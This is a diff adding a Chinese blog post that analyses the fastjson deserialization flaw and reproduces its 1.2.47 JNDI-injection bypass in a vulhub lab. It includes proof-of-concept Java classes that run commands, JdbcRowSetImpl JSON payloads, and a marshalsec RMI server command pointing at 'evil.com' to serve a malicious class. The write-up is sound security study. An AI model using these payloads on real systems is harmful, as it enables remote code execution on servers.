@@ -1,0 +1,241 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>fastjson反序列化漏洞分析与复现 | Fxizenta</title><meta name="keywords" content="反序列化,RCE,JNDI注入"><meta name="author" content="Fxizenta,fxizenta14@gmail.com"><meta name="copyright" content="Fxizenta"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="对于fastjson反序列化漏洞的分析和对于最新的1.2.47版本的JNDI注入绕过的复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson反序列化漏洞分析与复现">
+<meta property="og:url" content="http://fxizenta.design/2021/05/29/fastjson/index.html">
+<meta property="og:site_name" content="Fxizenta">
+<meta property="og:description" content="对于fastjson反序列化漏洞的分析和对于最新的1.2.47版本的JNDI注入绕过的复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://fxizenta.design/img/sea_and_city.jpg">
+<meta property="article:published_time" content="2021-05-29T13:21:06.000Z">
+<meta property="article:modified_time" content="2021-05-29T15:57:33.977Z">
+<meta property="article:author" content="Fxizenta">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="JNDI注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fxizenta.design/img/sea_and_city.jpg"><link rel="shortcut icon" href="/img/head.jpg"><link rel="canonical" href="http://fxizenta.design/2021/05/29/fastjson/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-05-29 23:57:33'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Fxizenta" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/sea_and_city.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fxizenta</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">fastjson反序列化漏洞分析与复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-29T13:21:06.000Z" title="发表于 2021-05-29 21:21:06">2021-05-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-29T15:57:33.977Z" title="更新于 2021-05-29 23:57:33">2021-05-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf-web/">ctf_web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h1><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>FastJson是开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到Java Bean。Fastjson应用范围非常广，在github上star数超过22k。2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。2020年6月1日 fastjson爆发新的反序列化远程代码执行漏洞，fastjson 1.2.68及以前版本存在黑客利用漏洞，可绕过autoType限制，直接远程执行任意命令攻击服务器，风险极大。本文简要介绍Fastjson反序列化漏洞利用原理并复现被利用过程，以使得技术人员在工作中对Fastjson反序列化漏洞有更进一步的认识，提高重视程度。</p>
+<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Fastjson反序列化漏洞被利用的原因，可以归结为两方面：</p>
+<ul>
+<li>Fastjson提供了反序列化功能，允许用户在输入JSON串时通过“@type”键对应的value指定任意反序列化类名；</li>
+<li>Fastjson自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的setter方法及部分getter方法。</li>
+</ul>
+<p>对编程人员而言，在使用Fastjson反序列化时会使用到Fastjson所提供的几个静态方法：</p>
+<ul>
+<li>parse (String text)</li>
+<li>parseObject(String text)</li>
+<li>parseObject(String text, Class clazz)</li>
+</ul>
+<p>无论使用上述哪种方式处理JSON字符串，都会有机会调用目标类中符合要求的Getter方法或者Setter方法，如果一个类中的Getter或者Setter方法满足调用条件并且存在可利用点，那么这个攻击链就产生了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String cmd;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Poc</span><span class="params">()</span></span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Poc() is called&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getCmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;getCmd() is called&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> cmd;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;setCmd() is called&quot;</span>);</span><br><span class="line">		<span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">		Runtime.getRuntime().exec(cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPoc</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		String Poc = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;poc.test.Poc\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">		JSONObject b = JSON.parseObject(Poc);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出顺序</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Poc() is called</span><br><span class="line">setCmd() is called</span><br><span class="line">getCmd() is called</span><br></pre></td></tr></table></figure>
+<p>Fastjson允许用户在输入JSON串时通过<strong>“@type”键对应的value指定任意反序列化类名</strong>，为了让服务端按照指定类型反序列化，所以这里再引入一个@type。通过type指定了反序列化的类型，在给parseObject传参时，@type指定了当前字符串按照Poc类来解析。在Poc类中写了一个无参构造方法、getter和setter方法。根据结果显示，在反序列化时同时调用了无参构造函数以及getter和setter方法，setter方法中中通过exec执行了外部命令计算器。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>对于 **<code>fastjson版本 &lt;= 1.2.24</code>**的情况，利用思路主要有2种</p>
+<ul>
+<li>通过触发点**<code>JSON.parseObject()</code><strong>这个函数，将</strong><code>json</code><strong>中的类设置成</strong><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>**并通过特意构造达到命令执行</li>
+<li>通过**<code>JNDI注入</code>**</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.demo;</span><br><span class="line"></span><br><span class="line">~~~~<span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">poc</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        poc t = <span class="keyword">new</span> poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>≤1.2.24</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://localhost:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>绕过</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;name&quot;</span>:&#123;</span><br><span class="line">					<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">					<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">				&#125;,</span><br><span class="line"><span class="attr">&quot;x1001&quot;</span>:&#123;</span><br><span class="line">				<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://localhost:9999/Exploit&quot;</span>,</span><br><span class="line">				<span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>JDNI(≤1.2.47)</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="将com-sun-rowset-JdbcRowSetImpl存入-mappings-中"><a href="#将com-sun-rowset-JdbcRowSetImpl存入-mappings-中" class="headerlink" title="将com.sun.rowset.JdbcRowSetImpl存入 mappings 中"></a>将com.sun.rowset.JdbcRowSetImpl存入 mappings 中</h3><p><code>DefaultJSONParser</code>→<code>checkAutoType</code>-&gt;<code>getClassFromMapping（为null）</code>-&gt; <code>deserializers.findClass(typeName)</code>,所以返回<code>java.lang.class</code>→通过 <code>config.getDeserializer</code> 获得反序列化的路由类 <code>MiscCodec</code>-&gt;调用该路由类的<code>deserialze(this, clazz, fieldName)</code>方法→</p>
+<p><code>parser.parse()</code>提取<code>com.sun.rowset.JdbcRowSetImpl</code>赋值给<code>objVal</code></p>
+<p>→<code>TypeUtils.loadClass</code>-&gt;loadClass的重载方法将<code>com.sun.rowset.JdbcRowSetImpl</code>存入checkAutoType的mappings中</p>
+<h3 id="绕过并执行实现RCE"><a href="#绕过并执行实现RCE" class="headerlink" title="绕过并执行实现RCE"></a>绕过并执行实现RCE</h3><p>前面一样不过传入的typename是com.sun.rowset.JdbcRowSetImpl→<code>checkAutoType</code>-&gt;由于第一次解析中将<code>com.sun.rowset.JdbcRowSetImpl</code>存入 <code>mappings</code> 中通过<code>TypeUtils.getClassFromMapping(typeName)</code>;获取到 <code>com.sun.rowset.JdbcRowSetImpl</code> 对象然后返回该对象（完成绕过)→调用<code>deserializer.deserialze(this, clazz, fieldName)</code>，不同的是这次得到的反序列化路由类为<code>FastjsonASMDeserializer</code>。→<code>deserialze</code>方法→在<code>setValue</code>中通过<code>method.invoke(object, value)</code>反射执行<code>com.sun.rowset.JdbcRowSetImpl.setAutoCommit</code>方法</p>
+<h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><p>跟进<code>setAutoCommit</code>中的<code>this.connect()</code>方法</p>
+<p><code>this.connect</code>对成员变量<code>dataSourceName</code>进行<code>lookup</code>，成功利用jndi注入</p>
+<p>利用链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Exec:<span class="number">620</span>,Runtime <span class="comment">//命令执行Lookup:417,InitalContext  </span></span><br><span class="line"><span class="comment">//jndi </span></span><br><span class="line">lookup函数通过rmi加载恶意类setAutoCommit:<span class="number">4067</span>,JdbcRowSetImpl <span class="comment">//通过setAutoCommit触发lookup函数setValue:96,</span></span><br><span class="line">FieldDeserializer <span class="comment">//反射调用传入类的set函数deserialze:600, </span></span><br><span class="line">JavaBeanDeserializer <span class="comment">//通过循环调用传入类 </span></span><br><span class="line">set,get,is函数parseObject:<span class="number">368</span>,DefaultJSONParser <span class="comment">//解析传入的json字符串</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>文章内环境配置完全省略，请自行寻找环境配置教程</p>
+<p>复现针对1.2.47的反序列化漏洞，采用JDNI注入的方式</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
+<li>docker</li>
+<li>docker-compose</li>
+<li>vulhub</li>
+<li>win10</li>
+<li>Ubuntu18.04 VPS</li>
+<li>java1.8</li>
+<li>python3.7</li>
+<li>marshalsec</li>
+<li>burpsuite</li>
+</ul>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>主要是用python3起的http目录服务和marshalsec起的rmi服务，靶机则是用的vulhub+docker-compose</p>
+<h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></p>
+<p>使用vulhub的docker文件</p>
+<p>目录为vulhub/fastjson/1.2.47-rce</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>docker和docker-compose以及相关使用请自行学习</p>
+<h3 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h3><p>首先准备一个java恶意类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并且编译</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac TouchFile.java</span><br></pre></td></tr></table></figure>
+<p>然后在恶意类的目录下用python起一个http服务（注意这里使用的python是3.7，python2语法不同请自行百度）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 33333//端口看你个人喜欢</span><br></pre></td></tr></table></figure>
+<h3 id="准备RMI服务器"><a href="#准备RMI服务器" class="headerlink" title="准备RMI服务器"></a>准备RMI服务器</h3><p><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
+<p>借助marshalsec项目，启动一个RMI项目，然后编译项目，然后在target下运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://evil.com/#TouchFile&quot;</span> 9999</span><br></pre></td></tr></table></figure>
+<p>成功启动RMI服务</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021fastjson1.png"></p>
+<h2 id="result"><a href="#result" class="headerlink" title="result"></a>result</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 容器号 bash //进入容器</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br></pre></td></tr></table></figure>
+<p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021fastjson2.png"></p>
+<p>有seccess，漏洞利用成功</p>
+<p>exit退出容器 down掉docker，复现结束</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:fxizenta14@gmail.com">Fxizenta</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://fxizenta.design/2021/05/29/fastjson/">http://fxizenta.design/2021/05/29/fastjson/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://fxizenta.design" target="_blank">Fxizenta</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/JNDI%E6%B3%A8%E5%85%A5/">JNDI注入</a></div><div class="post_share"><div class="social-share" data-image="/img/sea_and_city.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/05/18/ciscn2021/"><img class="next-cover" src="/img/mountains2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2021ciscn_web_wp</div></div></a></div></nav></div><div 